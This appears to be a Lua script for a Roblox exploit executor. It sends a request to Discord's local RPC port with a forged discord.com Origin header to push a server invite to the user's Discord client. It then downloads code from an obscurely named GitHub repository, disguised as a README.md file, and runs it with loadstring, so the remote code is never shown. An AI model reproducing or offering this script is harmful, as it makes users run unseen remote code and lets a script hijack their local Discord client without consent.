local request = (syn and syn.request) or (http and http.request) or http_request
   
if request then
    request(
        {
            Url = "http://127.0.0.1:6463/rpc?v=1",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["Origin"] = "https://discord.com"
            },
            Body = game:GetService("HttpService"):JSONEncode(
                {
                    cmd = "INVITE_BROWSER",
                    args = {code = "56D9EMjUnm"},
                    nonce = game:GetService("HttpService"):GenerateGUID(false)
                }
            )
        }
    )
end

loadstring(game:HttpGet(('https://raw.githubusercontent.com/cool83birdcarfly02six/ugyadui829vc/main/README.md'),true))()

